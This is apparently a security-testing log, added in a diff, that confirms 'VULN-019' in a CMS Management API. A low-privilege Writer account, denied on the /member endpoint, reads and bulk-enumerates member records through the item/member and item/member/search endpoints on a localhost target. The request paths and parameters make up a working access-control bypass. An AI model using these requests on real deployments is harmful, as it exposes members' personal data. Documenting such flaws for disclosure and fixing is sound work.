@@ -1,0 +1,17 @@
+==============================================================================
+VULN-019: item/member[/search] is floor-only → cross-section member PII enumeration
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: MemberItemControllerBase.cs:12 (no SectionAccessMembers) — GET item/member[/search]
+[SETUP] admin authenticated to Management API
+[SETUP] created front-end member 'SecretMember_ddf124e0' (key=25d15c4b-01d9-4d60-a143-98422d7df654) via the Members-gated /member endpoint
+[SETUP] created default Writer lowuser_708b7f00@example.invalid; allowedSections=['Umb.Section.Content', 'Umb.Section.Library']
+[INFO] Writer holds NO Members section — the Members boundary is what we cross below
+[STEP] baseline: GET /member/{key} via the real, Members-section-gated endpoint
+[PROOF] GET /member/{key} → 403 Forbidden — SectionAccessMembers is enforced here (as it should be)
+[STEP] attack: GET item/member?id={key} (floor-only item endpoint) — the section check is MISSING here
+[PROOF] item/member → 200 leaked member PII: name='SecretMember_ddf124e0' kind=Default memberType=icon-user
+[STEP] attack: GET item/member/search?query=Secret&take=100000 — bulk enumeration (unclamped take)
+[PROOF] item/member/search → 200, total=4; enumerated member names include ['SecretMember_6fec41cc', 'SecretMember_9a70b886', 'SecretMember_2f0affc4', 'SecretMember_ddf124e0']
+[PROOF] a Writer with no Members section just enumerated the membership across the section boundary
+==> VULN-019: CONFIRMED — Writer with no Members section read member PII via item/member (403 on the real /member)
